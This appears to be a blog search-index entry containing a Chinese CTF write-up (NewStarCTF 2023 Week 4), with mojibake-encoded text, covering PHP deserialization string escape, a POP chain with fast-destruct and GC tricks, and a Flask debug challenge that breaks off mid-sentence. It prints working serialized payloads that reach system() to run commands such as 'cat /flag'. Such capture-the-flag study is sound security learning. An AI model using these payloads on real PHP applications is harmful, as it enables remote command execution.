<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>(æœªåšå®Œ)Writeup_2023_NewStarCTF_Week4</title>
    <link href="/2023/11/28/week4-Writeup_2023_NewStarCTF_Week4/"/>
    <url>/2023/11/28/week4-Writeup_2023_NewStarCTF_Week4/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTFç¬¬å››å‘¨ï¼Œèœé¸Ÿçš„wp</p><span id="more"></span><hr><h2 id="é€ƒ"><a href="#é€ƒ" class="headerlink" title="é€ƒ"></a>é€ƒ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;bad&quot;</span>,<span class="hljs-string">&quot;good&quot;</span>,<span class="hljs-variable">$str</span>);<span class="hljs-comment">//ç»è¿‡wafåé•¿åº¦åŠ ä¸€</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GetFlag</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])))); www-data www-data<br></code></pre></td></tr></table></figure><p>ç®€å•ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ï¼Œä»£ç é™åˆ¶äº†<code>$cmd</code>çš„å€¼åªèƒ½æ˜¯<code>whoami</code>ï¼Œä¸è¿‡è¾“å…¥çš„<code>$key</code>å¯æ§ï¼ŒåŒæ—¶ç»è¿‡<code>str_replace</code>å<code>bad</code>è¢«æ¢æˆ<code>good</code>ï¼Œä¼šå¾€ååä¸€ä¸ªå­—ç¬¦ã€‚</p><p>æ„é€ <code>&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;</code>ï¼Œè¿™ä¸œè¥¿é•¿åº¦ä¸€å…±<code>22</code>ï¼Œæ‰€ä»¥è¦æ”¾<code>22</code>ä¸ª<code>bad</code>ã€‚ç»è¿‡<code>waf</code>åè¢«æ›¿æ¢å®ƒåå‡ºå»ã€‚</p><p><code>payload:</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$key</span>=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad<span class="hljs-string">&quot;;s:3:&quot;</span>cmd<span class="hljs-string">&quot;;s:2:&quot;</span><span class="hljs-built_in">ls</span><span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/justrun1.png" alt="justrun1"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$key</span>=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad<span class="hljs-string">&quot;;s:3:&quot;</span>cmd<span class="hljs-string">&quot;;s:4:&quot;</span><span class="hljs-built_in">ls</span> /<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/juestrun2.png" alt="juestrun2"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$key</span>=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad<span class="hljs-string">&quot;;s:3:&quot;</span>cmd<span class="hljs-string">&quot;;s:9:&quot;</span><span class="hljs-built_in">cat</span> /flag<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><code>flag&#123;86b29bdb-7b5e-4348-b81e-84953119c4fc&#125;</code></p><h2 id="More-Fast"><a href="#More-Fast" class="headerlink" title="More Fast"></a>More Fast</h2><p>é¢˜ç›®æè¿°ï¼šå†å¿«ä¸€ç‚¹æˆ‘å°±èƒ½æ‹¿åˆ°Flagäº†,å¦‚æœDestructèƒ½æ—©ä¸€ç‚¹è§¦å‘å°±å¥½äº†â€¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errMsg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;errMsg);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡</span><br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">evil</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reverse</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>) </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Web</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">//ä»invokeæ–¹æ³•è·³åˆ°è¿™é‡Œ</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>,<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>))&#123; <br>            (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);<span class="hljs-comment">//system(&#x27;cat /fl*&#x27;)</span><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not Flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">//ç±»è¢«å½“æˆå­—ç¬¦ä¸²å¤„ç†ï¼Œä»destructè·³åˆ°è¿™</span><br>        <span class="hljs-variable">$wel</span> = <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;good;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;NewStar&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Misc</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;good job but nothing&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fast&#x27;</span>]);<br><br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Nope&quot;</span>);<br>Fatal error: Uncaught <span class="hljs-built_in">Exception</span>: Nope in /<span class="hljs-keyword">var</span>/www/html/index.php:<span class="hljs-number">55</span> Stack trace: <span class="hljs-comment">#0 &#123;main&#125; thrown in /var/www/html/index.php on line 55</span><br></code></pre></td></tr></table></figure><p>æ­£å¸¸<code>pop</code>é“¾æ„é€ çš„é¢˜ä¸è¿‡åº•ä¸‹åŠ äº†ä¸ª<code>throw new Exception(&quot;Nope&quot;);</code>ã€‚æœ€å¼€å§‹æ²¡æ³¨æ„è¿™ä¸ªä¸œè¥¿ç›´æ¥å†™äº†é“¾å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//__destructå¼€å¤´ï¼Œ__toStringï¼Œ__getï¼Œ__invokeï¼Œevil</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errMsg</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reverse</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Web</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;system&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;ls&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Misc</span></span>&#123;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Crypto</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reverse</span>();<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pwn</span>();<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Web</span>();<br><span class="hljs-variable">$a</span> -&gt; errMsg = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span> -&gt; obj = <span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$c</span> -&gt; func = <span class="hljs-variable">$d</span>;<br><span class="hljs-variable">$d</span> -&gt; obj = <span class="hljs-variable">$e</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br></code></pre></td></tr></table></figure><p>åé¢æ‰çŸ¥é“è€ƒç‚¹æ˜¯<code>fast destruct</code>ï¼Œä¸‹é¢çš„å†…å®¹å‚è€ƒäº†ï¼š<code>https://eastjun.top/posts/php_unserialize_tricks/</code></p><p>é€šå¸¸ååºåˆ—åŒ–çš„å…¥å£éƒ½æ˜¯<code>__destruct()</code>æ–¹æ³•ï¼Œ&#96;&#96;__wakeup()<code>æ–¹æ³•çš„å†…å®¹ä¸€èˆ¬ä¸ºååºåˆ—åŒ–è®¾ç½®äº†æŸäº›é™åˆ¶ï¼Œéœ€è¦æˆ‘ä»¬ç»•è¿‡ã€‚**å¦‚æœåœ¨ååºåˆ—åŒ–æ“ä½œä¹‹åæŠ›å‡ºäº†å¼‚å¸¸åˆ™ä¼šè·³è¿‡</code>__destruct()<code>å‡½æ•°çš„æ‰§è¡Œã€‚å¯ä»¥ç†è§£ä¸º</code>throw<code>è¿™ä¸ªå‡½æ•°å›æ”¶äº†è‡ªåŠ¨é”€æ¯çš„ç±»ï¼Œå¯¼è‡´</code>destruct<code>æ£€æµ‹ä¸åˆ°æœ‰ä¸œè¥¿é”€æ¯ï¼Œä¹Ÿå°±æ²¡æ³•è§¦å‘</code>destruct&#96;å‡½æ•°**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//å€Ÿç”¨è¿™ä½å¸ˆå‚…æ–‡ç« ä¸­çš„ä¸€ä¸ªæ —å­ï¼š</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Clazz</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Hacker&quot;</span>);<br><br></code></pre></td></tr></table></figure><p><img src="/img/fastdes1.png" alt="fastdes1"></p><p><code>POST</code>ä¼ <code>O:5:&quot;Clazz&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:4:&quot;args&quot;;s:6:&quot;whoami&quot;;&#125;</code>ä¸ä¼šå¾—åˆ°ä»»ä½•ç»“æœã€‚</p><p>å› ä¸ºååºåˆ—åŒ–æ“ä½œæ‰§è¡Œåæ²¡æœ‰ç«‹åˆ»æ‰§è¡Œ<code>__destruct()</code>æ–¹æ³•ï¼Œè€Œæ˜¯æŠ›å‡ºäº†å¼‚å¸¸å¯¼è‡´<code>__destruct()</code>æ–¹æ³•è¢«è·³è¿‡ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä¿®æ”¹åºåˆ—åŒ–å¾—åˆ°çš„å­—ç¬¦ä¸²ä½¿å¾—ååºåˆ—åŒ–è§£æå‡ºé”™ï¼Œå¯¼è‡´<code>__destruct()</code>æ–¹æ³•è¢«æå‰æ‰§è¡Œã€‚</p><p>æˆ‘ä»¬æ­£å¸¸çš„åºåˆ—åŒ–ç»“æœæ˜¯ï¼š<code>O:5:&quot;Clazz&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:4:&quot;args&quot;;s:6:&quot;whoami&quot;;&#125;</code></p><p>å¯ä»¥ä¿®æ”¹ä¸ºï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">//æœ«å°¾åŠ å…¥æ•°å­—1</span><br>O<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Clazz&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;func&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;system&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;args&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;whoami&quot;</span>;<span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-comment">//å»æ‰ç»“å°¾çš„å¤§æ‹¬å·</span><br>O<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Clazz&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;func&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;system&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;args&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;whoami&quot;</span>;<br></code></pre></td></tr></table></figure><p><code>unserialize()</code>å‡½æ•°åœ¨æ‰«æåˆ°åºåˆ—åŒ–å­—ç¬¦ä¸²æ ¼å¼æœ‰è¯¯æ—¶ä¼šæå–è§¦å‘å¯¹è±¡çš„<code>__destruct()</code>æ–¹æ³•å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚</p><p><code>data=O:5:&quot;Clazz&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:4:&quot;args&quot;;s:6:&quot;whoami&quot;;1&#125;</code></p><p><img src="/img/fastdes3.png" alt="fastdes3"></p><p>åé¢çœ‹äº†å…¶å®ƒå¸ˆå‚…çš„<code>wp</code>å‘ç°è¿˜æœ‰å…¶å®ƒè§£æ³•ï¼š</p><p><code>https://blog.csdn.net/m0_73512445/article/details/133694293</code></p><p><code>https://blog.csdn.net/Myon5/article/details/134018456</code></p><p><strong>GCå›æ”¶æœºåˆ¶æå‰è§¦å‘__destruct()</strong></p><p>åœ¨PHPä¸­ï¼Œä½¿ç”¨å¼•ç”¨è®¡æ•°å’Œå›æ”¶å‘¨æœŸæ¥è‡ªåŠ¨ç®¡ç†å†…å­˜å¯¹è±¡çš„ï¼Œå½“ä¸€ä¸ªå˜é‡è¢«è®¾ç½®ä¸ºNULLï¼Œæˆ–è€…æ²¡æœ‰ä»»ä½•æŒ‡é’ˆæŒ‡å‘æ—¶ï¼Œå®ƒå°±ä¼šè¢«å˜æˆåƒåœ¾ï¼Œè¢«GCæœºåˆ¶è‡ªåŠ¨å›æ”¶æ‰ã€‚åœ¨å›æ”¶çš„è¿‡ç¨‹ä¸­ï¼Œå®ƒä¼šè‡ªåŠ¨è§¦å‘_destructæ–¹æ³•ã€‚<br>å¯ä»¥ä»¤<code>$v = array($a,NULL)</code>ç„¶å<code>echo serialize($v)</code>:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Start&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errMsg&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Crypto&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Reverse&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Pwn&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Web&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ls&quot;</span>;&#125;&#125;&#125;&#125;&#125;i:<span class="hljs-number">1</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åæŠŠ<code>i:1;N;</code>çš„<code>1</code>æ”¹æˆ<code>0</code>:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Start&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errMsg&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Crypto&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Reverse&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Pwn&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Web&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ls&quot;</span>;&#125;&#125;&#125;&#125;&#125;i:<span class="hljs-number">0</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>è‡³äºä¸ºå•¥ä¿®æ”¹æˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥šã€‚ã€‚</p><h2 id="midsql"><a href="#midsql" class="headerlink" title="midsql"></a>midsql</h2><p><img src="/img/midsql1.png" alt="midsql1"></p><p>åˆ©ç”¨<code>sleep</code>å…ˆåˆ¤æ–­å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥ï¼š</p><p>&#96;&#96;</p><h2 id="flask-disk"><a href="#flask-disk" class="headerlink" title="flask disk"></a>flask disk</h2><p><img src="/img/flaskdisk1.png" alt="flaskdisk1"></p><p>ä¸‰ä¸ªè·¯ç”±ï¼š<code>list</code>ï¼Œ<code>upload</code>ï¼Œ<code>console</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">/list<br>app.py 1746b 2023-10-14 11:16:00<br>/upload<br>ä¸Šä¼ æ–‡ä»¶<br>/console<br>è¾“å…¥PINç <br></code></pre></td></tr></table></figure><p>ä¸€å¼€å§‹ä»¥ä¸ºè¦å»ç”Ÿæˆ<code>PIN</code>ç ç„¶åè¿›æ§åˆ¶å°ã€‚ã€‚ä½†æ£é¼“åŠå¤©ä¹Ÿæ²¡æ‰¾åˆ°èƒ½è¯»æˆ‘éœ€è¦çš„æ•°æ®çš„åœ°æ–¹ã€‚</p><p><code>upload</code>è¿™ä¸ªè·¯ç”±å€’æ˜¯æ²¡å•¥é™åˆ¶ï¼Œä½†æˆ‘ä¸Šä¼ å®Œä¸œè¥¿ä¸çŸ¥é“ä¸Šä¼ è·¯å¾„æ˜¯å•¥ã€‚</p><p>åé¢çœ‹äº†ä¸‹<code>wp</code>(å‚è€ƒï¼š<code>https://blog.csdn.net/m0_73512445/article/details/133694293</code>):</p><p>å› ä¸ºè®¿é—®<code>console</code>è¿™ä¸ªè·¯ç”±ä¼šæç¤ºè¦è¾“å…¥<code>PIN</code>ç (è¯´æ˜<code>flask</code>å¼€å¯äº†<code>debug</code>æ¨¡å¼ã€‚<code>flask</code>å¼€å¯äº†<code>debug</code>æ¨¡å¼ä¸‹ï¼Œ<code>app.py</code>æºæ–‡ä»¶è¢«ä¿®æ”¹åä¼šç«‹åˆ»åŠ 